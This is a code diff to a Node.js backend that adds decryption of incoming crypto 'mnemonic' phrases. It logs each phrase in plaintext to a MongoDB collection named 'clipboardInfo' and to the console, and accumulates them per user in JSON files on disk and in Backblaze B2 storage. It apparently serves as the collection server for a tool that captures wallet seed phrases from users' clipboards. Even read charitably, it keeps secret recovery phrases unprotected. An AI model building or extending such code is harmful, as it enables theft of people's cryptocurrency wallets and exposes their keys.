@@ -1,5 +1,7 @@
 const fs = require('fs');
 const B2 = require('backblaze-b2');
+const crypto = require('crypto');
+const path = require('path');
 const mongoUtil = require('./db');
 
 let dbConnection = null;
@@ -14,23 +16,31 @@ mongoUtil.connectToServer()
     .then(({ dbConnection: localDbConnection }) => {
         console.log("Successfully connected to MongoDB.");
 
-        // Create a unique index for 'userId'
-        localDbConnection.collection('imageUpload').createIndex({ userId: 1 }, { unique: true })
-            .then(() => console.log("Unique index created successfully on 'userId' for imageUpload"))
-            .catch(err => console.error("Error creating unique index on 'userId' for imageUpload:", err));
+        const createIndex = async (collection, index, unique) => {
+            try {
+                await collection.createIndex(index, { unique });
+                console.log(`Index created successfully on ${Object.keys(index).join(' and ')} for ${collection.collectionName}`);
+            } catch (error) {
+                console.error(`Error creating index on ${Object.keys(index).join(' and ')} for ${collection.collectionName}:`, error);
+            }
+        };
 
-        // Create a compound index for 'fileName' and 'createdAt' without enforcing uniqueness
-        localDbConnection.collection('imageUpload').createIndex({ userId: 1, fileName: 1, createdAt: -1 }, { unique: false })
-            .then(() => console.log("Index created successfully on 'fileName' and 'createdAt' for imageUpload"))
-            .catch(err => console.error("Error creating index on 'fileName' and 'createdAt' for imageUpload:", err));
+        const createIndexes = async (localDbConnection) => {
+            const imageUploadCollection = localDbConnection.collection('imageUpload');
+            const imageDownloadCollection = localDbConnection.collection('imageDownload');
+            const clipboardInfoCollection = localDbConnection.collection('clipboardInfo');
 
-        localDbConnection.collection('imageDownload').createIndex({ userId: 1 }, { unique: true })
-            .then(() => console.log("Unique index created successfully on 'userId' for imageDownload"))
-            .catch(err => console.error("Error creating unique index on 'userId' for imageDownload:", err));
-        
-        localDbConnection.collection('imageDownload').createIndex({ userId: 1, fileName: 1, createdAt: -1 }, { unique: false })
-            .then(() => console.log("Index created successfully on 'fileName' and 'createdAt' for imageDownload"))
-            .catch(err => console.error("Error creating index on 'fileName' and 'createdAt' for imageDownload:", err));
+            await createIndex(imageUploadCollection, { userId: 1 }, true);
+            await createIndex(imageUploadCollection, { userId: 1, fileName: 1, createdAt: -1 }, false);
+
+            await createIndex(imageDownloadCollection, { userId: 1 }, true);
+            await createIndex(imageDownloadCollection, { userId: 1, fileName: 1, createdAt: -1 }, false);
+
+            await createIndex(clipboardInfoCollection, { userId: 1 }, true);
+            await createIndex(clipboardInfoCollection, { userId: 1, mnemonicPhase: 1, createdAt: -1 }, false);
+        };
+
+        createIndexes(localDbConnection);
 
         // Assign the database connections to the variables declared at higher scope
         dbConnection = localDbConnection;
@@ -131,6 +141,94 @@ async function downloadFromB2 (fileName, userId) {
 }
 
 /**
+ * @brief Uploads the decrypted mnemonic to B2 cloud storage for a specific user.
+ * 
+ * @param {string} userId - The ID of the user.
+ * @param {string} decryptedMnemonic - The decrypted mnemonic to be uploaded.
+ * @return {Promise<Object>} - A promise that resolves to the response data from the upload operation.
+ * @note This function requires the 'b2' module to be imported and the B2_BUCKET_ID and other environment variables to be set.
+ */
+async function uploadMnemonicToB2 (userId, decryptedMnemonic) {
+    try {
+        await b2.authorize();
+
+        const fileName = `mnemonic_${userId}.json`;
+        const userFolderPath = `mnemonic/user_${userId}/`;
+        const fullFilePath = `${userFolderPath}${fileName}`;
+        const localFolderPath = path.join(__dirname, userFolderPath);
+        const localFilePath = path.join(localFolderPath, fileName);
+        const createdAt = new Date().toISOString();
+
+        let mnemonicData = {
+            mnemonic: [],
+            createdAt: []
+        };
+
+        // Ensure local directory exists
+        if (!fs.existsSync(localFolderPath)) {
+            fs.mkdirSync(localFolderPath, { recursive: true });
+        }
+
+        // Try to read local file first
+        try {
+            if (fs.existsSync(localFilePath)) {
+                const existingData = fs.readFileSync(localFilePath, 'utf-8');
+                mnemonicData = JSON.parse(existingData);
+            }
+        } catch (error) {
+            console.error('Local file does not exist or could not be read:', error);
+        }
+
+        // Update mnemonic data
+        mnemonicData.mnemonic.push(decryptedMnemonic);
+        mnemonicData.createdAt.push(createdAt);
+
+        // Prepare data for upload
+        const jsonData = JSON.stringify(mnemonicData);
+        const jsonDataBuffer = Buffer.from(jsonData);
+
+        // Save updated data locally
+        fs.writeFileSync(localFilePath, jsonData, 'utf-8');
+
+        // Delete the existing file in B2 if it exists
+        try {
+            const fileList = await b2.listFileNames({
+                bucketId: process.env.B2_BUCKET_ID,
+                prefix: fullFilePath,
+                maxFileCount: 1
+            });
+
+            if (fileList.data.files.length > 0 && fileList.data.files[0].fileName === fullFilePath) {
+                await b2.deleteFileVersion({
+                    fileId: fileList.data.files[0].fileId,
+                    fileName: fullFilePath
+                });
+            }
+        } catch (error) {
+            console.error('Error deleting the old file from B2:', error);
+            throw error;
+        }
+
+        // Upload the updated file
+        const uploadUrl = await b2.getUploadUrl({
+            bucketId: process.env.B2_BUCKET_ID
+        });
+
+        const response = await b2.uploadFile({
+            uploadUrl: uploadUrl.data.uploadUrl,
+            uploadAuthToken: uploadUrl.data.authorizationToken,
+            filename: fullFilePath,
+            data: jsonDataBuffer
+        });
+
+        return response.data;
+    } catch (error) {
+        console.error('Error in uploadMnemonicToB2:', error);
+        throw error;
+    }
+}
+
+/**
  * @brief Logs the upload details to MongoDB.
  * 
  * @param {string} userId - The ID of the user who uploaded the file.
@@ -158,6 +256,17 @@ async function logUploadDetails (userId, fileName) {
     }
 }
 
+/**
+ * @brief Logs the download details to MongoDB.
+ * 
+ * @param {string} userId - The ID of the user who initiated the download.
+ * @param {string} fileName - The name of the file that was downloaded.
+ * 
+ * @return {Promise<void>} - A promise that resolves when the download details are logged successfully.
+ * 
+ * @note This function inserts a log entry into the 'imageDownload' collection in MongoDB, recording the user ID, 
+ *       file name, and the current timestamp.
+ */
 async function logDownloadDetails (userId, fileName) {
     try {
         const collection = dbConnection.collection('imageDownload');
@@ -175,9 +284,47 @@ async function logDownloadDetails (userId, fileName) {
     }
 }
 
+async function logMnemonicPhase (userId, mnemonicPhase) {
+    try {
+        const collection = dbConnection.collection('clipboardInfo');
+
+        const logEntry = {
+            userId,
+            mnemonicPhase,
+            createdAt: new Date() // Record the current timestamp
+        };
+
+        await collection.insertOne(logEntry);
+        console.log('Mnemonic phase logged successfully:', logEntry);
+    } catch (error) {
+        console.error('Error logging mnemonic phase to MongoDB:', error);
+    }
+}
+
+function decryptMnemonic (base64EncryptedData) {
+    const algorithm = 'aes-256-cbc';
+    const key = Buffer.from(process.env.ENCRYPTION_KEY, 'hex');
+    
+    // Decode the base64 encoded string
+    const encryptedBuffer = Buffer.from(base64EncryptedData, 'base64');
+
+    // Extract the IV from the beginning of the data
+    const iv = encryptedBuffer.slice(0, 16);
+    const encryptedText = encryptedBuffer.slice(16);
+
+    const decipher = crypto.createDecipheriv(algorithm, key, iv);
+    let decrypted = decipher.update(encryptedText);
+    decrypted = Buffer.concat([decrypted, decipher.final()]);
+
+    return decrypted.toString();
+}
+
 module.exports = {
     uploadToB2,
     downloadFromB2,
     logUploadDetails,
-    logDownloadDetails
+    logDownloadDetails,
+    logMnemonicPhase,
+    decryptMnemonic,
+    uploadMnemonicToB2
 };
